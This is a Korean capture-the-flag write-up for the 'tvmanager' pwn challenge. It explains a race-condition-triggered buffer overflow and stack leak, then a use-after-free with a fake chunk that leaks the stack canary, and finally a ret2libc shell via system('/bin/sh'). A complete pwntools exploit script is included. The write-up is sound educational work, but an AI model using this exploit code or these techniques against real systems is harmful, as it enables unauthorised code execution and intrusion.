---
title: "tvmanager Write-up"
date: 2024-08-01 18:30:00 +0900
categories: [WRITE-UP, PWN]
tags: [hs2024, ctf, pwn, md5, hash, collision, race condition, fake chunk, use after free, uaf]     # TAG names should always be lowercase
---

# tvmanager Write-up

tvmanager 문제 write-up.

## 1. Environment
- Ubuntu 16.04
- GLIBC: 2.23
```shell
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

네트워크 환경은 192.168 대역에서 통신 가능하다고 가정.

## 2. 바이너리 분석

username을 input으로 받고, `/home/tvmanager/{md5(username).hexdigest()}` 경로를 working directory로 지정.

backup 돼있는 데이터를 load한 뒤 4가지 메뉴 반복 수행.

1. list movie
    - linked list를 순회하면서 데이터를 출력.
2. register
    - 기존 linked list 뒤에 새로운 node를 등록.
    - `md5(title).hexdigest()` 파일명으로 파일에 데이터를 저장한다.
3. braodcast
    - `md5(title)` 파일을 `node.size` 크기만큼 읽어서 socket send
    - 수신 IP: `192.168.floor.room:channel`
4. exit

linked list node는 아래와 같이 구성돼있다.
```c
struct struct_node // sizeof=0x14
{
    int size;
    int category_idx;
    char *title;
    struct_node *ptr_next;
    struct_node *ptr_prev;
};
```

## 3. 취약점 분석

취약점은 크게 2개를 확인 할 수 있다.

### 3.1. BOF / Stack leak

`broadcast` 함수를 보면, 객체에 쓰여있는 size가 0x3ff 이하일 경우, fgetc 결과가 -1이 아닐 때 까지(파일 끝까지) 계속해서 읽는다.

![vuln bof](/assets/img/posts/HS2024-1/tvmanager/vuln_bof.png){:width="400px"}

여기에서 파일에 들어있는 데이터의 길이가 예상과 다를 경우, BOF와 Leak이 둘 다 발생 할 수 있다.

예상하는 size보다 파일에 있는 데이터가 큰 경우: BOF

예상하는 size보다 파일에 있는 데이터가 작은 경우: Stack leak

### 3.2. md5 collision / Race condition

위의 취약점을 trigger하기위해서는 프로그램 메모리 상의 예상하는 데이터 길이와 실제 filesystem에 있는 파일의 크기가 다르도록 설정해야한다.

그 방법으로는 크게 2가지가 있다.

1. 첫번째 방법은 md5 collision을 이용하는 것이다.

    파일 제목을 `md5(title)`로 지정하는데, 파일 중복 검사는 title 평문으로 이루어지기 때문에 같은 파일제목을 갖는 2개의 노드를 만들 수 있다.

    <div style="display: flex; justify-content: space-between;">
        <img src="/assets/img/posts/HS2024-1/tvmanager/dup_title.png" style="width: 80%;" alt="dup_title">
        <img src="/assets/img/posts/HS2024-1/tvmanager/md5_filename.png" style="height: 100%;" alt="md5_filename">
    </div>

2. 두번째 방법은 Race condition을 이용하는 것이다.

    같은 id로 여러개의 세션에서 로그인 한 뒤, 서로 다른 세션에서 같은 title의 노드를 만들면 파일의 내용을 쉽게 바꿀 수 있다.

두번째 방법을 채택해서 exploit을 진행했다.

## 4. Exploit 전략

Exploit을 하기 위한 전략.
1. Leak addresses.
2. Free 1st node with BOF.
3. Add new node(Use after free).
4. Leak canary value(with printout title of node1).
5. Get shell with RTL

### 4.1. Leak addresses

1번 세션과 2번 세션을 같은 이름으로 로그인한 뒤, 같은 title로 연속적으로 파일을 생성한다.

1번 세션에서는 파일의 데이터가 0x3f0 byte일 것으로 예상하고있으나, 2번 세션에 의해 실제 파일의 길이는 1 byte이다.

`send_to_room` 함수를 통해 buffer 변수를 0x3f0 만큼 읽으면 기존에 메모리에 남아있던 다양한 주소값들이 한꺼번에 leak된다.

이를 바탕으로 `heap_base`, `libc_base`, `pie_base`, `1st node’s address`, `canary’s address` 등을 얻을 수 있다.

```python
sess1.register(title, 0x3f0, b'A' * 0x3f0)
time.sleep(SLEEP_TICK)

sess2.register(title, 0x1, b'B' * 0x1)
time.sleep(SLEEP_TICK)

leaked = b''
def listen_background(port):
    global leaked
    l = listen(port)
    c = l.wait_for_connection()
    leaked = c.recv()
    # print(leaked)
    c.close()
    l.close()

port = 5959
t = threading.Thread(target=listen_background, args=(port,))
t.start()

time.sleep(SLEEP_TICK)
sess1.broadcast(1)
t.join()

assert leaked, "Failed to leak"

print(f"Leaked: {leaked}")

node1_addr = u32(b'\x80'+leaked[1:4])
heap_base = node1_addr - 0x1180
canary_addr = u32(leaked[-12:-8]) - 0x18
libc_base = u32(leaked[-20:-16]) - 0x1b35a0
pie_base = u32(leaked[-16:-12]) - 0x2349

print(f"heap_base: {hex(heap_base)}")
print(f"libc_base: {hex(libc_base)}")
print(f"pie_base: {hex(pie_base)}")
print(f"node1_addr: {hex(node1_addr)}")
print(f"&canary: {hex(canary_addr)}")
```

### 4.2. Leak Canary
1. BOF를 활용해 1번째 node를 free시킨다.

2. 새로운 node를 만들 때, title에 malloc이 될 때 1번째 node의 주소가 할당된다.

2. fake chunk를 만들어 1번째 node의 포인터를 조작할 수 있다.

3. 1번째 node에 title에 해당하는 포인터 주소를 canary 주소로 바꾸고 canary를 leak한다.

#### 4.2.1. Free first node
이번엔 BOF를 통해 1번째 node를 free할 것이다.

3번째 세션에서 Leak address 에서 했던 것과 마찬가지로 파일을 다시 쓰는데, 이번에는 0x400보다 긴 주소로 작성한다.

<div style="display: flex; justify-content: space-between;">
    <img src="/assets/img/posts/HS2024-1/tvmanager/broadcast_variables.png" style="width: 90%;" alt="broadcast_variables">
    <img src="/assets/img/posts/HS2024-1/tvmanager/broadcast_free.png" style="width: 80%;" alt="broadcast_free">
</div>

그러면 이번에는 buffer의 길이인 0x400을 넘어서 `size` 변수와, `ptr_data` 변수의 값까지 덮을 수 있다. ( 그 뒤에는 Canary가 있어서 더 이상 덮지는 못한다.)

1번째 노드의 주소를 알고 있으므로 값을 조작하여 1번째 노드를 free시킨다.


```python
# free 1st node
payload = b'C' * 0x400
payload += p32(0x410)   # size > 0x3ff
payload += p32(node1_addr)  # address to free
sess3.register(title, len(payload), payload)
time.sleep(SLEEP_TICK)
sess1.broadcast(1)
```

#### 4.2.2. Leak canary
마지막으로 free했던 주소가 다시 할당되므로, 새 node의 `title`을 malloc 할 때 1번째 노드의 주소가 할당되고, 이 데이터가 `title`로 넣어준 값으로 수정된다.

fake chunk를 만드는데 strlen 등으로 인해 title에 null byte 포함하는것이 불가능하다.

![print list](/assets/img/posts/HS2024-1/tvmanager/print_list.png)

print_list를 보면, `printf("%s", categories[ptr->category_idx]);` 를 수행해야 하므로 `categories[ptr->category_idx]` 가 pointer가 되도록 주소를 잘 조절해야한다.

![bss](/assets/img/posts/HS2024-1/tvmanager/bss.png)

`category` 목록이 있는 전역변수 바로 위에 `menu` 목록 변수가 있으므로 `categories[ptr->category_idx]`가 `menu`를 가르키도록 음수값을 지정했다.

`fopen` 에서 에러가 발생하지 않도록 하기위해 해당 메모리의 title을 제목으로 갖는 가짜 파일을 sess3에서 만들어 준다.

canary 값의 최하위 1바이트는 0이므로 `&canary+1`에 있는 값을 구해서 0을 붙였다.

```python
# make fake_chunk
fake_chunk = b''
fake_chunk += p32(0x41414141)    # size
fake_chunk += p32(0xffffffec)      # category_idx * 4 + categories must pointer
fake_chunk += p32(canary_addr + 1)      # title


# register 2nd node that title is fake_chunk
sess1.register(fake_chunk, 4, b'D' * 4)    

# for open file in broadcase func
fake_file = fake_chunk + p32(heap_base + 0x1198)
sess3.register(fake_file, 4, b'E' * 4)
time.sleep(SLEEP_TICK)

# list movies
movie_list = sess1.broadcast(2)
canary = u32(b'\x00' + movie_list.split(b'Titile : ')[1].split(b'\n')[0][0:3])
print(f"Canary: {hex(canary)}")
```

#### 4.2.3. Get shell

이제 canary 값을 구했으니 다시 BOF를 한 뒤, RTL을 한다.

libc를 leak했으니 이를 이용해서 간단하게 `system("/bin/sh")` 를 호출했다.

```python
# ROP Stage
libc.address = libc_base

system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

new_title = b'hihihihi'
sess1.register(new_title, 0x3f0, b'A' * 0x3f0)
time.sleep(SLEEP_TICK)

payload = b'C' * 0x400
payload += p32(0x3f0)
payload += b'AAAA'
payload += p32(canary)
payload += b'AAAA'*3
payload += p32(system_addr)
payload += b'BBBB'
payload += p32(bin_sh_addr)
sess2.register(new_title, len(payload), payload)
time.sleep(SLEEP_TICK)

sess1.broadcast(3)
sess1.interactive()
```

## 5. Result

exploit을 수행한 결과 아래와 같이 shell을 획득할 수 있다.

![Exploit success](/assets/img/posts/HS2024-1/tvmanager/exploit_success.png)

### Full exploit code

```python
import time
import random
import string
import threading
import subprocess

from pwn import *


context.log_level = 'INFO'
context.arch = 'x86_64'

binary = 'tvmanager'
e = ELF(binary)
libc = ELF('./libc.so.6')
r = ROP(libc)

HOST, PORT = '127.0.0.1 8106'.split(' ')
SLEEP_TICK = 0.5

class tvmanager:
    def __init__(self, host: str, port : str):
        self.host = host
        self.port = port
        self.binary = 'tvmanager'
        self.p = remote(host, port)
        self.pid = int(subprocess.check_output(
            f"docker top {binary} -eo pid,comm | grep {binary} | awk '{{print $1}}'", 
            shell=True
        ).decode().strip().split()[-1])

    def gdb_attach(self, gdb_script: str):
        if not gdb_script:
            gdb.attach(self.pid, GDB_SCRIPT, exe=self.binary)
        else:
            gdb.attach(self.pid, gdb_script, exe=self.binary)
        
    def interactive(self):
        self.p.interactive()

    def close(self):
        self.p.close()

    def login(self, name: bytes):
        self.p.sendafter(b'name > ', name)

    def list_movies(self):
        self.p.sendlineafter(b'> ', b'1')
        print("[*] list movies")
        print(self.p.recv())

    def register(self, title: bytes, size: int, data: bytes):
        self.p.sendlineafter(b'> ', b'2')
        self.p.sendlineafter(b'title of movie > ', title)
        self.p.sendlineafter(b'category of movie > ', b'1')
        self.p.sendafter(b'size of movie > ', str(size).encode())
        self.p.send(data)

    def broadcast(self, idx: int):
        self.p.sendlineafter(b'> ', b'3')
        movie_list = self.p.recvuntil(b'Input index of movie > ')

        self.p.sendline(str(idx).encode())
        self.send_to_room(72, 154, 5959) # send to 192.168.72.154:5959
        return movie_list

    def send_to_room(self, floor: int, room: int, channel: int):
        """ 
        send data to 192.168.{floor}.{room}:{channel} 
        addr.sin_addr.s_addr = (((room << 8) + floor) << 16) + 0xA8C0;
        we can control this (room, floor can be negative)
        """
        self.p.sendlineafter(b'Input floor-room-channel > ', f'{floor}-{room}-{channel}'.encode())


'''
struct struct_node // sizeof=0x14
{
    int size;
    int category_idx;
    char *title;
    struct_node *ptr_next;
    struct_node *ptr_prev;
};
'''

if __name__ == '__main__':
    name = ''.join(random.choices(string.ascii_letters, k=0x10)).encode()

    sess1 = tvmanager(HOST, PORT)
    sess1.login(name)
    time.sleep(SLEEP_TICK)

    sess2 = tvmanager(HOST, PORT)
    sess2.login(name)
    time.sleep(SLEEP_TICK)
    
    sess3 = tvmanager(HOST, PORT)
    sess3.login(name)
    time.sleep(SLEEP_TICK)    

    title = b'my_movie'

    sess1.register(title, 0x3f0, b'A' * 0x3f0)
    time.sleep(SLEEP_TICK)

    sess2.register(title, 0x1, b'B' * 0x1)
    time.sleep(SLEEP_TICK)

    leaked = b''
    def listen_background(port):
        global leaked
        l = listen(port)
        c = l.wait_for_connection()
        leaked = c.recv()
        # print(leaked)
        c.close()
        l.close()

    port = 5959
    t = threading.Thread(target=listen_background, args=(port,))
    t.start()

    time.sleep(SLEEP_TICK)
    sess1.broadcast(1)
    t.join()

    assert leaked, "Failed to leak"

    print(f"Leaked: {leaked}")

    node1_addr = u32(b'\x80'+leaked[1:4])
    heap_base = node1_addr - 0x1180
    canary_addr = u32(leaked[-12:-8]) - 0x18
    libc_base = u32(leaked[-20:-16]) - 0x1b35a0
    pie_base = u32(leaked[-16:-12]) - 0x2349

    print(f"heap_base: {hex(heap_base)}")
    print(f"libc_base: {hex(libc_base)}")
    print(f"pie_base: {hex(pie_base)}")
    print(f"node1_addr: {hex(node1_addr)}")
    print(f"&canary: {hex(canary_addr)}")


    # leak canary!
    # free 1st node
    payload = b'C' * 0x400
    payload += p32(0x410)   # size > 0x3ff
    payload += p32(node1_addr)  # address to free
    sess3.register(title, len(payload), payload)
    time.sleep(SLEEP_TICK)
    sess1.broadcast(1)

    # make fake_chunk
    fake_chunk = b''
    fake_chunk += p32(0x41414141)    # size
    fake_chunk += p32(0xffffffec)      # category_idx * 4 + categories must pointer
    fake_chunk += p32(canary_addr + 1)      # title

    # register 2nd node that title is fake_chunk
    sess1.register(fake_chunk, 4, b'D' * 4)    

    # for open in broadcase func
    fake_file = fake_chunk + p32(heap_base + 0x1198)
    sess3.register(fake_file, 4, b'E' * 4)
    time.sleep(SLEEP_TICK)

    # list movies
    movie_list = sess1.broadcast(2)
    canary = u32(b'\x00' + movie_list.split(b'Titile : ')[1].split(b'\n')[0][0:3])
    print(f"Canary: {hex(canary)}")

    # ROP Stage
    libc.address = libc_base

    system_addr = libc.symbols['system']
    bin_sh_addr = next(libc.search(b'/bin/sh'))

    new_title = b'hihihihi'
    sess1.register(new_title, 0x3f0, b'A' * 0x3f0)
    time.sleep(SLEEP_TICK)

    payload = b'C' * 0x400
    payload += p32(0x3f0)
    payload += b'AAAA'
    payload += p32(canary)
    payload += b'AAAA'*3
    payload += p32(system_addr)
    payload += b'BBBB'
    payload += p32(bin_sh_addr)
    sess2.register(new_title, len(payload), payload)
    time.sleep(SLEEP_TICK)

    sess1.broadcast(3)
    sess1.interactive()

```